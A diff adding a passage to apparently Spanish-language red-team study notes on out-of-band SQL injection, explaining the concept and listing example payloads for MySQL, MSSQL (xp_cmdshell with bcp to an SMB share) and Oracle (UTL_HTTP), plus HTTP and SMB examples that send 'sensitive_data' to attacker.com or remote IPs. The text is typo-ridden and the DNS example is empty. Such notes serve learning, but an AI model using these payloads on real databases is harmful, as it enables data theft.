@@ -239,7 +239,63 @@ Esta injección usa filtros singulares o doblues quotas o escapes
 
 # Out-of-band SQL Injection
 
-Este tipo de tecnica lo usan los red teamers para filtrar datos o ejecutar codigo malicioso cuando directamente nos metodos tradicionales no funcionan. 
+Este tipo de tecnica lo usan los red teamers para filtrar datos o ejecutar codigo malicioso cuando directamente nos metodos tradicionales no funcionan. Cuando el atacante utiliza el mismo canal para atacar y recibir datos, esta injeccion utiliza canales separados para enviar el payload y recibir la respuesta. 
+
+
+![image](https://github.com/user-attachments/assets/959ea548-fea6-4c0d-9075-25f208994566)
+
+Una de las grandes ventajas es que es más sigilioso y rentalbe. Usa diferentes canales, los atacanates miniminal los riesgos de deteccion y de mantener una persistencia de conexion. El atacante injecta un SQL a la base de datos haceindo una consutla por ejemplo DNS. 
+
+### PORQUE usar OOB
+
+EN estos escenarios, oob canales activa canales para filtrar datos sin necesidad de tener feedback del servidor. Tiene mecanismos de seugirdad como procedimientos guardados, output codificado, aplicacion por nivel, respuestas directas. 
+
+### Técnicas
+
+MYSQL y MARIAdb
+
+```
+SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
+```
+
+Microsoft SQL server
+
+```
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
+```
+
+Oracle
+
+```
+DECLARE
+  req UTL_HTTP.REQ;
+  resp UTL_HTTP.RESP;
+BEGIN
+  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
+  UTL_HTTP.GET_RESPONSE(req);
+END;
+```
+
+### Ejemplos
+
+HTTP
+
+```
+SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;.
+```
+
+DNS
+
+SMB
+
+```
+SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';.
+```
+
+# Otras técnicas
+
+
+
 
 
 
